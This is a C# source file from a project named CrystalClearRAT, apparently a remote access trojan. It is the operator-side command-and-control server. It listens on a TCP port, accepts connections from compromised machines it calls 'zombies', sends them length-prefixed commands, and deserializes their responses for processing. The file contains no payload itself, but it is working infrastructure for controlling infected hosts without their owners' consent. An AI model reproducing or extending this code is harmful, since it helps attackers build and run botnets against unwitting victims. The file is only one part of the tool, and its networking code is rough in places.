using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Input;
using CrystalClearRAT.Functions;
using CrystalClearRAT.ZombieModel;
using CrystalRATShared.Commands;
using CrystalRATShared.Serialization;

namespace CrystalClearRAT.Web
{
    public static class Server
    {
        private static readonly Queue<Action> sendRequest = new Queue<Action>();
        private static readonly ManualResetEvent sendingDone = new ManualResetEvent(false);

        private static bool sendMonitorRunning = false;

        public static bool IsRunning { get; private set; } = false;

        public static Socket ServerSocket { get; private set; }


        public static void ClearRequests()
        {
            sendRequest.Clear();
        }

        private static void SendMonitor()
        {
            if (!sendMonitorRunning)
                Task.Run(async () =>
                {
                    sendMonitorRunning = true;
                    while (true)
                    {
                        await Task.Delay(10);
                        if (sendRequest.Count > 0)
                        {
                            sendRequest.Dequeue()();
                            sendingDone.WaitOne();
                        }
                        else break;
                    }
                    sendMonitorRunning = false;
                });

        }

        public static void Start(int port)
        {
            if (IsRunning) throw new InvalidOperationException("The server is already running.");

            ServerSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            ServerSocket.Bind(new IPEndPoint(IPAddress.Any, port));
            ServerSocket.Listen(0);

            ServerSocket.BeginAccept(new AsyncCallback(AcceptCallback), null);
        }

        public static void Send(byte[] data, Zombie zombie)
        {
            sendRequest.Enqueue(() =>
            {
                sendingDone.Reset();
                byte[] dataLength = BitConverter.GetBytes(data.Length);
                try
                {
                    zombie.Socket.BeginSend(dataLength, 0, dataLength.Length, 0, new AsyncCallback(SendCallback), new StateObject(zombie, data));
                }

                catch (SocketException)
                {
                    zombie.Destroy();
                    sendingDone.Set();
                }
            });

            SendMonitor();

        }

        private static void SendCallback(IAsyncResult ar)
        {
            StateObject state = (StateObject)ar.AsyncState;
            try
            {
                state.Zombie.Socket.EndSend(ar);
                state.Zombie.Socket.Send(state.Buffer);
            }
            catch
            {
                state.Zombie.Destroy();
                sendingDone.Set();
            }
            sendingDone.Set();
        }

        private static void AcceptCallback(IAsyncResult ar)
        {
            Socket accepted = ServerSocket.EndAccept(ar);

            IPEndPoint acceptedEndPoint = (IPEndPoint)accepted.RemoteEndPoint;

            Zombie zombie;

            zombie = new Zombie(acceptedEndPoint.Address.ToString(), acceptedEndPoint.Port, accepted);

            Receive(zombie);

            ServerSocket.BeginAccept(new AsyncCallback(AcceptCallback), null);

        }



        private static void Receive(Zombie zombie)
        {
            byte bufLength = 4;
            byte[] buffer = new byte[bufLength];

            try
            {
                zombie.Socket.BeginReceive(buffer, 0, bufLength, 0, new AsyncCallback(ReceiveCallback), new StateObject(zombie, buffer));
            }
            catch (SocketException)
            {
                Console.WriteLine("Zombie disconnected. Cleaning up.");
                zombie.Destroy();

            }



        }

        private static void ReceiveCallback(IAsyncResult ar)
        {

            StateObject state = (StateObject)ar.AsyncState;

            try
            {
                state.Zombie.Socket.EndReceive(ar);
            }

            catch (SocketException)
            {
                Console.WriteLine("Zombie disconnected. Cleaning up.");
                state.Zombie.Destroy();
                return;

            }

            int bufSize = BitConverter.ToInt32(state.Buffer, 0);
            byte[] buffer;
            MemoryStream ms = new MemoryStream();

            while (bufSize > 0)
            {
                if (bufSize < state.Zombie.Socket.ReceiveBufferSize)
                {
                    buffer = new byte[bufSize];
                }

                else
                {
                    buffer = new byte[state.Zombie.Socket.ReceiveBufferSize];
                }

                int rec = state.Zombie.Socket.Receive(buffer, 0, buffer.Length, 0);
                bufSize -= rec;

                ms.Write(buffer, 0, rec);
            }

            ms.Close();

            byte[] data = ms.ToArray();

            ms.Dispose();

            if (CommandDataSerializer.Deserialize(data, FunctionManager.Process) == CommandFlags.DataCorrupted)
            {
                state.Zombie.Destroy();
                return;
            }

            Receive(state.Zombie);



        }


    }
}
